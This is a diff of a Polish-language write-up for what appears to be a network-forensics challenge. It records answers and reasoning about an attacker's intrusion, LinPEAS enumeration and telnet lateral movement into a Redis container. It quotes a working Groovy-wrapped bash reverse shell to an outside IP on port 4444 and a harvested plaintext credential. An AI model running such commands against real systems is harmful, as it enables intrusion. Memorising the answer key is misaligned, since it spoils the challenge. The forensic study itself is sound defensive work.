@@ -71,15 +71,82 @@ Analogicznie do poprzednich pytań w tych samych miejscach odczytujemy na jaki e
 After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?
 <details>
   <summary>Answer: Click me</summary>
-  xxx
+  4444
 </details>
 
 ```
-xxx
+W kolejnej komunikacji widzimy wykonanie komendy: def cmd = ["bash", "-c", "bash -i >& /dev/tcp/185.220.101.50/4444 0>&1"]; cmd.execute()
+W niej widac zawarty port.
+```
+
+#### Q7
+Once inside the compromised container, the attacker uploaded a well-known enumeration script to identify privilege escalation vectors. What privilege escalation enumeration script did the attacker download after gaining shell access?
+<details>
+  <summary>Answer: Click me</summary>
+  linpeas
+</details>
+
+```
+Po zestawieniu reverse shell , podążając za komunikacją w kolejnych tcp.stream widzimy komunikację po TCP w której odbywa między innymi pobranie: https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+```
+
+#### Q8
+What file did the attacker read to obtain lateral movement credentials? (Provide full path)
+<details>
+  <summary>Answer: Click me</summary>
+  /var/jenkins_home/credentials.txt
+</details>
+
+```
+Użyte narzędzie LinPEAS posiada wiele ciekawych modułów. Między innymi szuka "ciekawych" plików, sekretów, analizuje usługi, userów i wiele wiele innych. W streame TCP widac wynik prac skryptu, widać tez że atakujący otwiera plik z lokalizacji która jest odpowiedzią.
+```
+
+#### Q9
+What username and password combination did the attacker use for authentication to the second system? (Format: username:password)
+<details>
+  <summary>Answer: Click me</summary>
+  redis_user:R3d1s_Us3r_P@ss!
+</details>
+
+```
+Nawiązując do wcześniejszej odpowiedzi, w zawartości pliku są dane telnet dla redis. Widać nawiązanie sesji telnet tymi danymi.
+```
+
+#### Q10
+The attacker used a legacy protocol to connect to the second target system. What unencrypted protocol did the attacker use for lateral movement?
+<details>
+  <summary>Answer: Click me</summary>
+  telnet
+</details>
+
+```
+To konsekwencja tego co odkryliśmy w dwoch poprzednich pytaniach.
+```
+
+#### Q11
+After successfully authenticating with harvested credentials, the attacker gained access to a second container in the environment. Identifying this system helps map the scope of the compromise. What is the IP address of the second compromised system?
+<details>
+  <summary>Answer: Click me</summary>
+  172.16.10.20
+</details>
+
+```
+Odpowiedz na pytanie nadal jest powiązana z wczesniejszymi odpowiedzami. Adres kolejnego skompromitowanego systemu to adres na który akatujący łaczył się protokołem telnet.
+```
+
+#### Q12
+The Telnet login banner and subsequent enumeration revealed the hostname and the version of the data storage service running on the second compromised container. This information is crucial for identifying potential vulnerabilities. What is the hostname of the second compromised container and the version of the vulnerable data storage service? (Format: hostname, version)
+<details>
+  <summary>Answer: Click me</summary>
+  redis-db.corp.local, 5.0.7
+</details>
+
+```
+Na początku sesji telnet iwdać wywołanie komendy hostname co daje nam pierwsza częśc odpowiedzi. Druga częśc nawiązuje do "vulnerable data storage service" co nie do końca jest jasne. Ale przyjmując że jesteśmy na serwerze redis , to pewnie o niego chodzi. W trakcie tej sesji znowu użyto narzędzia "LinPEAS" i jeden z modułów skanuje "Analyzing Redis Files" co w efekcie daje nam w output informacje o wersji.
 ```
 
 #### Qx
-After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?
+xxx
 <details>
   <summary>Answer: Click me</summary>
   xxx
@@ -90,7 +157,7 @@ xxx
 ```
 
 #### Qx
-After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?
+xxx
 <details>
   <summary>Answer: Click me</summary>
   xxx
@@ -101,7 +168,7 @@ xxx
 ```
 
 #### Qx
-After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?
+xxx
 <details>
   <summary>Answer: Click me</summary>
   xxx
@@ -112,7 +179,7 @@ xxx
 ```
 
 #### Qx
-After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?
+xxx
 <details>
   <summary>Answer: Click me</summary>
   xxx
@@ -123,7 +190,7 @@ xxx
 ```
 
 #### Qx
-After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?
+xxx
 <details>
   <summary>Answer: Click me</summary>
   xxx
@@ -134,7 +201,62 @@ xxx
 ```
 
 #### Qx
-After confirming code execution, the attacker established a reverse shell connection back to their C2 infrastructure. What port number did the attacker use for the initial reverse shell listener?
+xxx
+<details>
+  <summary>Answer: Click me</summary>
+  xxx
+</details>
+
+```
+xxx
+```
+
+#### Qx
+xxx
+<details>
+  <summary>Answer: Click me</summary>
+  xxx
+</details>
+
+```
+xxx
+```
+
+#### Qx
+xxx
+<details>
+  <summary>Answer: Click me</summary>
+  xxx
+</details>
+
+```
+xxx
+```
+
+#### Qx
+xxx
+<details>
+  <summary>Answer: Click me</summary>
+  xxx
+</details>
+
+```
+xxx
+```
+
+#### Qx
+xxx
+<details>
+  <summary>Answer: Click me</summary>
+  xxx
+</details>
+
+```
+xxx
+```
+
+#### Qx
+xxx
 <details>
   <summary>Answer: Click me</summary>
   xxx
